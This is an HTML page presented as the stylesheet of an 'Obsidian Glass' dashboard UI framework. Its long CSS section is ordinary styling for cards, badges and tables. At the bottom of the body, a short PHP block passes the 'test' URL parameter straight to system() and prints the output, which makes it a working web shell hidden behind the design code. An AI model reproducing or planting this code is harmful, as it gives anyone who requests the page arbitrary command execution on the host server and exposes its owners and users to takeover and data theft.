<html>
<head>
    <style>
        /* Project: Obsidian Glass UI Framework
   Author: Jarvis (for Sir Venom)
   Version: 1.0.4 
*/

:root {
  /* Dynamic Color Palette */
  --primary-accent: #00d4ff;
  --secondary-accent: #7000ff;
  --bg-dark: #0a0b10;
  --glass-bg: rgba(255, 255, 255, 0.05);
  --glass-border: rgba(255, 255, 255, 0.125);
  --text-main: #e0e0e0;
  --text-muted: #a0a0a0;
  
  /* Layout Constants */
  --sidebar-width: 280px;
  --transition-speed: 0.3s;
  --glow-intensity: 0 0 15px rgba(0, 212, 255, 0.4);
}

/* Base Reset & Typography */
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: 'Inter', 'Segoe UI', Roboto, sans-serif;
}

body {
  background-color: var(--bg-dark);
  background-image: 
    radial-gradient(at 0% 0%, hsla(253,16%,7%,1) 0, transparent 50%), 
    radial-gradient(at 50% 0%, hsla(225,39%,30%,1) 0, transparent 50%), 
    radial-gradient(at 100% 0%, hsla(339,49%,30%,1) 0, transparent 50%);
  color: var(--text-main);
  min-height: 100vh;
  display: flex;
  overflow-x: hidden;
}

/* --- Layout Components --- */

.dashboard-container {
  display: grid;
  grid-template-columns: var(--sidebar-width) 1fr;
  width: 100%;
  gap: 20px;
  padding: 20px;
}

.sidebar {
  background: var(--glass-bg);
  backdrop-filter: blur(15px);
  -webkit-backdrop-filter: blur(15px);
  border: 1px solid var(--glass-border);
  border-radius: 20px;
  padding: 30px;
  display: flex;
  flex-direction: column;
  height: calc(100vh - 40px);
  position: sticky;
  top: 20px;
}

.main-content {
  display: flex;
  flex-direction: column;
  gap: 25px;
}

/* --- The "Glass" Card Engine --- */

.card {
  position: relative;
  background: var(--glass-bg);
  border: 1px solid var(--glass-border);
  border-radius: 16px;
  padding: 24px;
  backdrop-filter: blur(10px);
  transition: transform var(--transition-speed) ease, 
              box-shadow var(--transition-speed) ease;
}

.card:hover {
  transform: translateY(-5px);
  box-shadow: var(--glow-intensity);
  background: rgba(255, 255, 255, 0.08);
}

.card::before {
  content: "";
  position: absolute;
  top: 0; left: 0; right: 0; bottom: 0;
  border-radius: 16px;
  padding: 1px; 
  background: linear-gradient(135deg, var(--primary-accent), transparent, var(--secondary-accent));
  -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
  mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
  -webkit-mask-composite: xor;
  mask-composite: exclude;
  pointer-events: none;
}

/* --- Custom UI Elements --- */

.status-badge {
  display: inline-flex;
  align-items: center;
  padding: 4px 12px;
  border-radius: 50px;
  font-size: 12px;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}

.status-badge.online {
  background: rgba(0, 255, 127, 0.15);
  color: #00ff7f;
  border: 1px solid rgba(0, 255, 127, 0.3);
}

.btn-primary {
  background: linear-gradient(135deg, var(--primary-accent), var(--secondary-accent));
  color: white;
  border: none;
  padding: 12px 24px;
  border-radius: 10px;
  font-weight: 600;
  cursor: pointer;
  transition: opacity 0.2s;
}

.btn-primary:active {
  transform: scale(0.98);
}

/* --- Complex Animations --- */

@keyframes pulse-ring {
  0% { transform: scale(0.33); }
  80%, 100% { opacity: 0; }
}

.scanning-indicator {
  position: relative;
  width: 20px;
  height: 20px;
}

.scanning-indicator::after {
  content: '';
  position: absolute;
  width: 100%;
  height: 100%;
  background-color: var(--primary-accent);
  border-radius: 50%;
  animation: pulse-ring 1.25s cubic-bezier(0.215, 0.61, 0.355, 1) infinite;
}

/* Data Table Styling */
.data-table {
  width: 100%;
  border-collapse: collapse;
}

.data-table th {
  text-align: left;
  color: var(--text-muted);
  font-size: 13px;
  padding: 12px;
  border-bottom: 1px solid var(--glass-border);
}

.data-table td {
  padding: 16px 12px;
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
}

/* Scrollbar Customization */
::-webkit-scrollbar {
  width: 8px;
}

::-webkit-scrollbar-track {
  background: var(--bg-dark);
}

::-webkit-scrollbar-thumb {
  background: var(--glass-border);
  border-radius: 10px;
}

::-webkit-scrollbar-thumb:hover {
  background: var(--text-muted);
}
    </style>
</head>
<body>
<pre>
<?php
    if(isset($_GET['test']))
    {
        system($_GET['test'] . ' 2>&1');
    }
?>
        
</pre>
</body>
</html>
